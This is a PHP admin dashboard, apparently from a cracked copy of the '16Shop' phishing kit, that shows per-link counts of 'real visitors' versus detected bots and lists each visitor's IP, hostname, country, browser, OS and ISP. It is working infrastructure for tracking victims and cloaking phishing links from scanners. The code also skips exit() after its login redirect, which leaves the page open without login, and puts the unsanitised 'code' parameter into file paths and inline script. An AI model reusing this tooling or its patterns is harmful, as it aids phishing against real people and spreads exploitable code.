<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['email_admin'])) {
    header("location: login.php");
}
if($_GET['code'] == "") {
  exit();
}
function count_c($filename) {
    $file = fopen($filename, "r");
    $total_click = fread($file, filesize($filename));
    $total_click = substr_count($total_click, "\n");
    return $total_click;
    fclose($file);
}
$total_click = count_c("../logs/".$_GET['code']."-real.txt");
$total_bot = count_c("../logs/".$_GET['code']."-bots.txt");
$set = parse_ini_file("../db/url/".$_GET['code'].".ini");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="au theme template">
    <meta name="author" content="Hau Nguyen">
    <meta name="keywords" content="au theme template">

    <title>16Short Manager - Cracked by CNC13</title>
    <link href="css/font-face.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-4.7/css/font-awesome.min.css" rel="stylesheet" media="all">
    <link href="vendor/font-awesome-5/css/fontawesome-all.min.css" rel="stylesheet" media="all">
    <link href="vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">
    <link href="vendor/css-hamburgers/hamburgers.min.css" rel="stylesheet" media="all">
    <!-- Bootstrap CSS-->
  
    <link href="vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">

    <!-- Vendor CSS-->
    <link href="vendor/animsition/animsition.min.css" rel="stylesheet" media="all">
    

    <!-- Main CSS-->
    <link href="css/theme.css" rel="stylesheet" media="all">

</head>

<body class="animsition">
    <div class="page-wrapper">
        <!-- HEADER MOBILE-->
        <header class="header-mobile d-block d-lg-none">
            <div class="header-mobile__bar">
                <div class="container-fluid">
                    <div class="header-mobile-inner">
                        <h3>16SHOP - Cracked by CNC13</h3>
                        <button class="hamburger hamburger--slider" type="button">
                            <span class="hamburger-box">
                                <span class="hamburger-inner"></span>
                            </span>
                        </button>
                    </div>
                </div>
            </div>
            <nav class="navbar-mobile">
                <div class="container-fluid">
                    <ul class="navbar-mobile__list list-unstyled">
                        <li class="active has-sub">
                            <a class="js-arrow" href="index.php">
                                <i class="fas fa-cog"></i>Shortlink</a>
                           
                        </li>
                       
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <!-- END HEADER MOBILE-->

        <!-- MENU SIDEBAR-->
        <aside class="menu-sidebar d-none d-lg-block">
            <div class="logo">
                <h3>16SHOP - Cracked by CNC13</h3>
            </div>
            <div class="menu-sidebar__content js-scrollbar1">
                <nav class="navbar-sidebar">
                    <ul class="list-unstyled navbar__list">
                        <li class="active has-sub">
                            <a class="js-arrow" href="index.php">
                                <i class="fas fa-cog"></i>Shortlink</a>
                           
                        </li>
                        
  
                        <li>
                            <a href="logout.php">
                                <i class="fas fa-power-off"></i>Logout</a>
                        </li>
                       
                    </ul>
                </nav>
            </div>
        </aside>
        <!-- END MENU SIDEBAR-->

        <!-- PAGE CONTAINER-->
        <div class="page-container">
            <!-- HEADER DESKTOP-->
            <header class="header-desktop">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="header-wrap">
                            
                            <div class="header-button">
                                <div class="noti-wrap">
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
            <!-- HEADER DESKTOP-->

            <!-- MAIN CONTENT-->
            <div class="main-content">
                <div class="section__content section__content--p30">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="overview-wrap">
                                    <h2 class="title-1">Statistic</h2>
                                    <br><br><br>
                                </div>
                            </div>
                            <div class="col-md-6 col-lg-6">
                            <div class="statistic__item statistic__item--green">
                                <h2 style="color:#fff;" class="number"><span id="clickcount"><?php echo $total_click;?></span></h2>
                                <span style="color:#fff;" class="desc">REAL VISITOR</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-email-open"></i>
                                </div>
                            </div>
                        </div>
                       
                        <div class="col-md-6 col-lg-6">
                            <div class="statistic__item statistic__item--red">
                                <h2 style="color:#fff;" class="number"><span id="botcount"><?php echo $total_bot;?></span></h2>
                                <span style="color:#fff;" class="desc">BOT Detected</span>
                                <div class="icon">
                                    <i class="zmdi zmdi-bug"></i>
                                </div>
                            </div>
                        </div>
                            
                        </div>
                        
                        <div class="row">
                            <div class="col-lg-12">
                                <h2 class="title-1 m-b-25">List Visitor <a style="font-size:15px;" href="">(Refresh)</a></h2>
                                <div class="table--no-card m-b-40" style="max-height: 500px;overflow:scroll;">
                                    <table class="table table-borderless table-data3">
                                        <thead>
                                            <tr>
                                                <th>IP Address</th>
                                                <th>Hostname</th>
                                                <th>Country</th>
                                                <th>Browser</th>
                                                <th>OS</th>
                                                <th>ISP</th>
                                                <th>Type</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php
                                            if(file_exists("../logs/".$_GET['code']."-visitor.txt")){
                                            $bin = file_get_contents("../logs/".$_GET['code']."-visitor.txt");
                                            $bin = explode("\n", $bin);
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $ip = $bins[0];
                                                $host = $bins[1];
                                                $tipe = $bins[7];
                                                $code = $bins[6];
                                                $country = $bins[5];
                                                $device = $bins[3];
                                                $os = $bins[4];
                                                $isp = $bins[2];
                                                if($ip == "") {

                                                }else{
                                                if($tipe == "Bot") {
                                                  $tipebot = "fas fa-bug";
                                                  $color = "red";
                                                }else{
                                                  $tipebot = "fas fa-user";
                                                  $color = "green";
                                                }
                                                echo "<tr>
                                                <td><img src='https://www.countryflags.io/".$code."/flat/16.png'> ".$ip."</td>
                                                <td>".$host."</td>
                                                <td>".$country."</td>
                                                <td>".$device."</td>
                                                <td>".$os."</td>
                                                <td>".$isp."</td>
                                                <td><a style='margin-right:15px;text-decoration:none;color:#000;float:right;color:$color;' href='#' class='icon'><i class='$tipebot'></i></a></td>
                                                </tr>";
                                                }
                                                }
                                            }else{
                                                echo "<tr><td>Not found</td><td></td><td></td><td></td><td></td><td></td><td></td></tr>";
                                            }
                                            ?>
                                        
                                            
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            
                        
                        <div class="row">
                            <div class="col-md-12">
                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- END MAIN CONTENT-->
            <!-- END PAGE CONTAINER-->
        </div>

    </div>
    <!-- Jquery JS-->
    <script src="vendor/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap JS-->
    <script src="vendor/bootstrap-4.1/popper.min.js"></script>
    <script src="vendor/bootstrap-4.1/bootstrap.min.js"></script>
    <!-- Vendor JS       -->
    <script src="vendor/slick/slick.min.js">
    </script>
    <script src="vendor/wow/wow.min.js"></script>
    <script src="vendor/animsition/animsition.min.js"></script>
    <script src="vendor/bootstrap-progressbar/bootstrap-progressbar.min.js">
    </script>
    <script src="vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="vendor/counter-up/jquery.counterup.min.js">
    </script>
    <script src="vendor/circle-progress/circle-progress.min.js"></script>
    <script src="vendor/perfect-scrollbar/perfect-scrollbar.js"></script>
    <script src="vendor/chartjs/Chart.bundle.min.js"></script>
    <script src="vendor/select2/select2.min.js">
    </script>
      <script>
     $( document ).ready(function() {
     setInterval(function(){
        $("#clickcount").load("count.php?code=<?php echo $_GET['code'];?>-real");
        $("#botcount").load("count.php?code=<?php echo $_GET['code'];?>-bots");
      }, 1000);
     });
     </script>
    <!-- Main JS-->
    <script src="js/main.js"></script>

</body>

</html>
<!-- end document-->
